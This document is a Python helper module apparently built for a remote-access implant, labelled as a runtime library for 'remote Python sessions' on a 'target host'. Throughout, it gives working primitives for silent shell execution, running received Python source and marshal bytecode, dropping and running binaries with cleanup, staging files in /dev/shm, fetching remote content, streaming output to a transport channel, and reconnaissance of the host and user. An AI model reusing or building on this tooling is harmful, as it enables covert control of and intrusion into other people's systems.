"""Standard runtime helper library for remote Python sessions.

Provides an Anti-Corruption Layer (ACL) of multi-fallback primitives for
encoding, compression, hashing, archiving, storage, remote execution,
network requests, system inspection, and presentation without external
dependencies.
"""

import base64
import gzip
import hashlib
import io
import marshal
import os
import platform
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.request
from contextlib import suppress
from typing import IO

# --- Communication & Stream Channels ---

CH_STDOUT: int = 1
CH_STDERR: int = 2

# --- Encoding, Compression & Cryptographic Hashing ---

def hash_value(data: str | bytes, algo: str = "sha256") -> str:
    """Calculate the hexadecimal cryptographic digest of input data."""

    match data:
        case str():
            raw = data.encode()
        case _:
            raw = data

    with suppress(Exception):
        h = hashlib.new(algo)
        h.update(raw)
        return h.hexdigest()

    return hashlib.sha256(raw).hexdigest()


def decode_base64(data: str | bytes) -> bytes:
    """Decode Base64 input into raw bytes, returning empty bytes on invalid input."""

    if not data:
        return b""

    with suppress(Exception):
        return base64.b64decode(data)

    return b""


def encode_base64(data: str | bytes) -> str:
    """Encode raw bytes or string into an ASCII Base64 string."""

    match data:
        case str():
            raw = data.encode()
        case _:
            raw = data

    with suppress(Exception):
        return base64.b64encode(raw).decode("ascii")

    return ""


def compress_gzip(data: str | bytes) -> bytes:
    """Compress raw bytes or string using gzip format."""

    match data:
        case str():
            raw = data.encode()
        case _:
            raw = data

    with suppress(Exception):
        return gzip.compress(raw)

    return b""


def decompress_gzip(data: bytes) -> bytes:
    """Decompress gzip-formatted bytes into raw bytes."""

    if not data:
        return b""

    with suppress(Exception):
        return gzip.decompress(data)

    return b""


# --- File Storage, Archiving & Artifact Cleanup ---


def _resolve_writable_dir() -> str:
    """Resolve a writable ephemeral directory on the target host."""

    candidates = [
        tempfile.gettempdir(),
        "/dev/shm",
        "/tmp",
        "/var/tmp",
        os.getcwd(),
    ]
    for candidate in candidates:
        if candidate and os.path.isdir(candidate) and os.access(candidate, os.W_OK):
            return candidate
    return tempfile.gettempdir()


def store_file(data: bytes, target_path: str = "") -> str:
    """Write raw bytes to a target file or ephemeral location and return its path."""

    if not target_path:
        content_hash = hash_value(data)
        target_path = os.path.join(_resolve_writable_dir(), content_hash)

    with suppress(OSError):
        with open(target_path, "wb") as fh:
            fh.write(data)
        return target_path

    return ""


def remove_file(target_path: str) -> None:
    """Silently remove a target file or directory path."""

    if not target_path:
        return

    with suppress(OSError):
        if os.path.isdir(target_path) and not os.path.islink(target_path):
            shutil.rmtree(target_path, ignore_errors=True)
        else:
            os.remove(target_path)


def archive_dir(source_dir: str, target_path: str = "") -> bytes | str:
    """Package a directory into a compressed tar.gz archive in memory or on disk."""

    if not os.path.isdir(source_dir):
        return "" if target_path else b""

    with suppress(Exception):
        if target_path:
            with tarfile.open(target_path, "w:gz") as tar:
                tar.add(source_dir, arcname=".")

            return target_path

        buf = io.BytesIO()

        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            tar.add(source_dir, arcname=".")

        return buf.getvalue()

    return "" if target_path else b""


def extract_archive(source: bytes | str, dest_dir: str = ".") -> str:
    """Extract a compressed tar.gz archive from raw bytes or file path into a directory."""

    with suppress(Exception):
        os.makedirs(dest_dir, exist_ok=True)

        match source:
            case bytes():
                with tarfile.open(fileobj=io.BytesIO(source), mode="r:gz") as tar:
                    tar.extractall(dest_dir, filter="data")
            case str():
                if not os.path.isfile(source):
                    return ""

                with tarfile.open(source, mode="r:gz") as tar:
                    tar.extractall(dest_dir, filter="data")

        return dest_dir
    return ""


# --- Network Transfer Primitives ---


def fetch_url(
    url: str,
    target_path: str = "",
    headers: dict[str, str] | None = None,
    method: str = "GET",
    timeout: int = 5,
) -> bytes | str:
    """Retrieve remote content over HTTP/HTTPS into memory or a local file."""

    with suppress(Exception):
        req = urllib.request.Request(url, headers=headers or {}, method=method)

        with urllib.request.urlopen(req, timeout=timeout) as resp:
            payload: bytes = resp.read()

            if target_path:
                return store_file(payload, target_path)

            return payload

    return "" if target_path else b""


# --- Remote Execution & Subprocess Orchestration ---


def run_command(command: list[str] | str, timeout: int = 10) -> str:
    """Execute a system command silently and return stripped stdout, filtering all errors.

    If a list of command strings is provided, it tries each candidate in order until
    one succeeds with a non-zero-length stdout or zero exit code.
    """

    with suppress(Exception):
        match command:
            case str():
                candidates = [command]
            case list() if command and isinstance(command[0], str) and " " in command[0] or any(isinstance(c, str) for c in command):
                # If command is a list of candidate strings (fallback list)
                candidates = [c for c in command if isinstance(c, str)]
            case _:
                res = subprocess.run(
                    command,
                    shell=False,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    timeout=timeout,
                    check=False,
                )

                return res.stdout.strip()

        for cmd in candidates:
            with suppress(Exception):
                res = subprocess.run(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    timeout=timeout,
                    check=False,
                )

                if res.returncode == 0 and res.stdout:
                    return res.stdout.strip()

    return ""


def execute_source(code: str, filename: str = "<remote_payload>", scope: dict[str, object] | None = None) -> None:
    """Compile and evaluate Python source code within the target namespace."""

    try:
        compiled = compile(code, filename, "exec")
        exec(compiled, scope if scope is not None else globals())
    except (Exception, SystemExit) as exc:
        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)


def execute_bytecode(data: bytes, scope: dict[str, object] | None = None) -> None:
    """Unmarshal and execute compiled bytecode within the target namespace."""

    try:
        code_obj = marshal.loads(data)
        exec(code_obj, scope if scope is not None else globals())
    except (Exception, SystemExit) as exc:
        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)


def execute_binary(filepath: str, *args: str, cleanup: bool = False) -> None:
    """Set executable permissions, run a binary subprocess, and stream output."""

    try:
        with suppress(OSError):
            os.chmod(filepath, 0o700)

        proc = subprocess.Popen([filepath, *args], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        send_fn = globals().get("_send_frame")

        while proc.stdout:
            chunk = proc.stdout.read(4096)

            if not chunk:
                break

            if send_fn:
                send_fn(CH_STDOUT, chunk)
            else:
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()

        proc.wait()
    except OSError:
        pass
    finally:
        if cleanup:
            remove_file(filepath)


def execute_system_command(command: str, output_buffer: IO[bytes] | None = None) -> None:
    """Execute a shell command and stream output to a buffer or active transport channel."""

    with suppress(OSError):
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        send_fn = globals().get("_send_frame")

        while proc.stdout:
            chunk = proc.stdout.read(4096)

            if not chunk:
                break

            if output_buffer is not None:
                output_buffer.write(chunk)
            elif send_fn:
                send_fn(CH_STDOUT, chunk)
            else:
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()

        proc.wait()


# --- Presentation & Output Formatting ---


def label(title: str, content: str = "") -> None:
    """Print an uppercase underlined section header and optional content."""

    heading = title.upper()
    separator = "-" * len(heading)

    print(f"\n{heading}\n{separator}")

    if content:
        print(content)


def format_table(headers: list[str], rows: list[list[str]]) -> str:
    """Format headers and tabular string rows into an aligned plain-text table."""

    if not headers:
        return ""

    all_rows = [headers] + [list(row) for row in rows]
    col_widths = [max(len(str(row[i])) for row in all_rows if i < len(row)) for i in range(len(headers))]

    lines = []

    for row in all_rows:
        cells = (str(row[i]).ljust(col_widths[i]) if i < len(row) else "".ljust(col_widths[i]) for i in range(len(headers)))
        lines.append("  ".join(cells).rstrip())

    return "\n".join(lines)


# --- System Reconnaissance ---


def get_system_summary() -> dict[str, str | int]:
    """Collect core operating environment, platform, identity, and process attributes."""

    return {
        "platform": platform.system(),
        "architecture": platform.machine(),
        "release": platform.release(),
        "python_version": sys.version.split()[0],
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "pid": os.getpid(),
    }
